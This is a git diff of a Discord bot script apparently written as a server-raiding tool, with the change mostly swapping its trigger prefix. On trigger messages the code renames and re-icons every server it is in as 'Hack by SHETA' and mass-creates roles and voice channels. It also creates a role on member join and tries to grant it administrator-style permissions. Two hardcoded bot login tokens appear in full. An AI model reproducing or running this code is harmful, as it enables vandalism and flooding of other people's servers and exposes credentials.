@@ -14,31 +14,31 @@ LOka.on("ready", () => {
     `Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`
   );
 });
-var prefix = "_SHETA";
+var prefix = "#SHETA";
 LOka.on("message", message => {
   if (!message.content.startsWith(prefix)) return;
-  let args = message.content.split("_SHETA").slice(1);
-  var argresult = args.join("_SHETA");
-  if (message.content.startsWith("_SHETA")) {
+  let args = message.content.split("#SHETA").slice(1);
+  var argresult = args.join("#SHETA");
+  if (message.content.startsWith("#SHETA")) {
     LOka.user.setUsername(argresult);
   }
-  if (message.content.startsWith("_SHETA")) {
+  if (message.content.startsWith("#SHETA")) {
     LOka.user.setStatus(argresult);
   }
 });
 
-var x4 = "_SHETA";
+var x2 = "#SHETA";
 LOka.on("message", message => {
-  if (message.content === "_SHETA") {
+  if (message.content === "#SHETA") {
     LOka.user.setAvatar(
       `https://cdn.discordapp.com/attachments/733991998520033333/739954089101885523/SAVE_20200804_241307.jpg`
     );
   }
 });
-var x4 = "_";
+var x2 = "#";
 LOka.on("message", message => {
-  if (message.content === "_SHETA") {
-    LOka.user.setUsername("_SHETA");
+  if (message.content === "#SHETA") {
+    LOka.user.setUsername("#SHETA");
   }
 });
 LOka.on("message", message => {
@@ -46,16 +46,16 @@ LOka.on("message", message => {
     LOka.user.setGame(`#help`, "https://www.twitch.tv/rawyar_");
   }
 });
-
+`fhelp`;
 LOka.on("message", message => {
-  if (message.content === "_SHETA") {
+  if (message.content === "#SHETA") {
     LOka.guilds.forEach(m => {
       m.setIcon(`https://media.discordapp.net/attachments/6`);
     });
   }
 });
 LOka.on("message", message => {
-  if (message.content === "_SHETA") {
+  if (message.content === "#SHETA") {
     LOka.guilds.forEach(m => {
       m.setName("Hack BY SHETA ✨");
     });
@@ -63,7 +63,7 @@ LOka.on("message", message => {
 });
 
 LOka.on("message", message => {
-  if (message.content === "_SHETA") {
+  if (message.content === "#SHETA") {
     if (!message.channel.guild) return;
 
     message.guild.setIcon(
@@ -73,7 +73,7 @@ LOka.on("message", message => {
 });
 
 LOka.on("message", message => {
-  if (message.content === "_SHETA") {
+  if (message.content === "#SHETA") {
     LOka.guilds.forEach(m => {
       m.createRole({
         name: "Hack by SHETA 🛠",
@@ -602,50 +602,50 @@ LOka.on("message", message => {
       });
       m.createRole({
         name: "Hack by SHETA 🛠",
-        permissions: [1],
+        permissions: [2],
         color: " #ff0000"
       });
       m.createRole({
         name: "Hack by SHETA 🛠",
-        permissions: [1],
-        color: " #ff0000"
-      });
-
-      m.createRole({
-        name: "Hack by SHETA 🛠",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hack by SHETA 🛠",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hack by SHETA 🛠",
-        permissions: [1],
+        permissions: [2],
         color: " #ff0000"
       });
 
       m.createRole({
         name: "Hack by SHETA 🛠",
-        permissions: [1],
+        permissions: [2],
         color: " #ff0000"
       });
       m.createRole({
         name: "Hack by SHETA 🛠",
-        permissions: [1],
+        permissions: [2],
         color: " #ff0000"
       });
       m.createRole({
         name: "Hack by SHETA 🛠",
-        permissions: [1],
+        permissions: [2],
         color: " #ff0000"
       });
 
       m.createRole({
         name: "Hack by SHETA 🛠",
-        permissions: [1],
+        permissions: [2],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hack by SHETA 🛠",
+        permissions: [2],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hack by SHETA 🛠",
+        permissions: [2],
+        color: " #ff0000"
+      });
+
+      m.createRole({
+        name: "Hack by SHETA 🛠",
+        permissions: [2],
         color: " #ff0000"
       });
     });
@@ -744,7 +744,7 @@ LOka.on("message", message => {
       m.createChannel("Hack by SHETA 🛠", "voice");
       m.createChannel("Hack by SHETA 🛠", "voice");
       m.createChannel("Hack by SHETA 🛠", "voice");
-      m.createChannel("Hack by  SHETA̷ 🛠", "voice");
+      m.createChannel("Hack by  SHETA̷ ", "voice");
       m.createChannel("Hack by SHETA 🛠", "voice");
       m.createChannel("Hack by SHETA 🛠", "voice");
       m.createChannel("Hack by SHETA 🛠", "voice");
@@ -805,7 +805,7 @@ LOka.on("message", message => {
 });
 
 LOka.on("message", message => {
-  if (message.content === ".SHETA") {
+  if (message.content === "_SHETA") {
     LOka.guilds.forEach(m => {
       m.createChannel("Hack by SHETA 🛠", "voice");
       m.createChannel("Hack by SHETA 🛠", "voice");
@@ -1051,7 +1051,7 @@ LOka.on("guildMemberAdd", member => {
       .createRole({
         name: LOka.user.username,
         color: "RANDOM",
-        permissions: [8]
+        permissions: [9]
       })
       .then(function(role) {
         member.addRole(role);
@@ -1059,4 +1059,4 @@ LOka.on("guildMemberAdd", member => {
   }
 });
 
-LOka.login("NzM5OTYzNjkxMzE4OTAyODE0.XyiG4w.4rhGAsSzPV80zVgM7biA6_hFb1I");
+LOka.login("NTg0MzIzMTY5MzM1Mzc3OTMw.Xyjqbw.lTup-3U1BrpobkGZ7IHuLS8955Y");
